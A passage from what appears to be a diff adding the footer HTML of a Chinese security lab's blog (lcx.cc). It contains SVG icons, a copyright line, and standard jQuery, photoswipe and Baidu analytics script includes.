650.610918l-42.1244 31.157627-0.045025 0.151449c11.69946-41.020252 20.11206-81.5749 22.726607-116.858498C351.665315 564.212152 351.72876 563.345412 351.791182 562.469462z"></path>
+  <path d="M584.918753 182.033893l0 668.840094 70.318532 0 28.807093 80.512708 121.875768-80.512708 153.600307 0L959.520453 182.033893 584.918753 182.033893zM887.150192 778.934538l-79.837326 0-99.578949 65.782216-23.537066-65.782216-24.855084 0L659.341766 256.673847l227.807403 0L887.149169 778.934538z"></path>
+</svg>
+
+    </a>
+  
+    <a href="/" rel="me noopener" class="iconfont"
+      title="douban"  target="_blank"
+      >
+      <svg class="icon" style="" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
+  <path d="M926.917973 37.80608C959.65184 37.80608 986.19392 64.34816 986.19392 97.082027L986.19392 926.917973C986.19392 959.65184 959.65184 986.19392 926.917973 986.19392L97.082027 986.19392C64.34816 986.19392 37.80608 959.65184 37.80608 926.917973L37.80608 97.082027C37.80608 64.34816 64.34816 37.80608 97.082027 37.80608zM176.653653 176.19968 176.653653 252.678827 825.658027 252.678827 825.658027 176.19968zM217.719467 316.146347 217.719467 628.08064 273.524053 628.08064 341.292373 770.39616 157.259093 770.39616 157.259093 845.417813 842.949973 845.417813 842.949973 770.39616 654.226773 770.39616 722.899627 628.08064 783.67744 628.08064 783.67744 316.146347zM684.885333 392.891733 684.885333 553.987413 312.576 553.987413 312.576 392.891733zM570.770773 770.39616 426.653013 770.39616 359.621973 628.08064 639.443627 628.08064z"></path>
+</svg>
+
+    </a>
+
+
+<a href="https://lcx.cc/index.xml" rel="noopener alternate" type="application/rss&#43;xml"
+    class="iconfont" title="rss" target="_blank">
+    <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="30" height="30">
+  <path d="M819.157333 1024C819.157333 574.592 449.408 204.8 0 204.8V0c561.706667 0 1024 462.293333 1024 1024h-204.842667zM140.416 743.04a140.8 140.8 0 0 1 140.501333 140.586667A140.928 140.928 0 0 1 140.074667 1024C62.72 1024 0 961.109333 0 883.626667s62.933333-140.544 140.416-140.586667zM678.784 1024h-199.04c0-263.210667-216.533333-479.786667-479.744-479.786667V345.173333c372.352 0 678.784 306.517333 678.784 678.826667z"></path>
+</svg>
+
+  </a>
+   
+</div>
+
+<div class="copyright">
+
+  
+
+  <span class="copyright-year">
+    &copy;
+    
+      2010 -
+    2025
+    <span class="heart">
+      
+      <i class="iconfont">
+        <svg class="icon" viewBox="0 0 1025 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="14" height="14">
+  <path d="M1000.1 247.9c-15.5-37.3-37.6-70.6-65.7-98.9-54.4-54.8-125.8-85-201-85-85.7 0-166 39-221.4 107.4C456.6 103 376.3 64 290.6 64c-75.1 0-146.5 30.4-201.1 85.6-28.2 28.5-50.4 61.9-65.8 99.3-16 38.8-24 79.9-23.6 122.2 0.7 91.7 40.1 177.2 108.1 234.8 3.1 2.6 6 5.1 8.9 7.8 14.9 13.4 58 52.8 112.6 102.7 93.5 85.5 209.9 191.9 257.5 234.2 7 6.1 15.8 9.5 24.9 9.5 9.2 0 18.1-3.4 24.9-9.5 34.5-30.7 105.8-95.9 181.4-165 74.2-67.8 150.9-138 195.8-178.2 69.5-57.9 109.6-144.4 109.9-237.3 0.1-42.5-8-83.6-24-122.2z"
+   fill="#8a8a8a"></path>
+</svg>
+
+      </i>
+    </span><span class="author">
+        Nuclear'Atk（核攻击）网络安全实验室
+        
+      </span></span>
+
+  
+  
+
+  
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont">
+        
+        <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="35" height="35">
+  <path d="M510.866688 227.694839 95.449397 629.218702l235.761562 0-2.057869 328.796468 362.40389 0L691.55698 628.188232l241.942331-3.089361L510.866688 227.694839zM63.840492 63.962777l894.052392 0 0 131.813095L63.840492 195.775872 63.840492 63.962777 63.840492 63.962777zM63.840492 63.962777"></path>
+</svg>
+
+      </i>
+    </div>
+  </div>
+  
+<script type="text/javascript" src="/lib/jquery/jquery-3.2.1.min.js"></script>
+  <script type="text/javascript" src="/lib/slideout/slideout-1.0.1.min.js"></script>
+
+
+
+
+<script type="text/javascript" src="/js/main.638251f4230630f0335d8c6748e53a96f94b72670920b60c09a56fdc8bece214.js" integrity="sha256-Y4JR9CMGMPAzXYxnSOU6lvlLcmcJILYMCaVv3Ivs4hQ=" crossorigin="anonymous"></script>
+
+
+
+
+
+
+<script id="baidu_analytics">
+  var _hmt = _hmt || [];
+  (function() {
+    if (window.location.hostname === 'localhost') return;
+    var hm = document.createElement("script"); hm.async = true;
+    hm.src = "https://hm.baidu.com/hm.js?90a2a7fb2c0fa46d3747ec9668f12a39";
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(hm, s);
+  })();
+</script>
+
+<script id="baidu_push">
+  (function(){
+    if (window.location.hostname === 'localhost') return;
+    var bp = document.createElement('script'); bp.async = true;
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+      bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+      bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+  })();
+</script>
+
+
+
+  
+    <script type="text/javascript" src="/js/load-photoswipe.js"></script>
+    <script type="text/javascript" src="/lib/photoswipe/photoswipe.min.js"></script>
+    <script type="text/javascript" src="/lib/photoswipe/photoswipe-ui-default.min.js"></script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/my.js"></script>
+
+
+</body>
+</html>
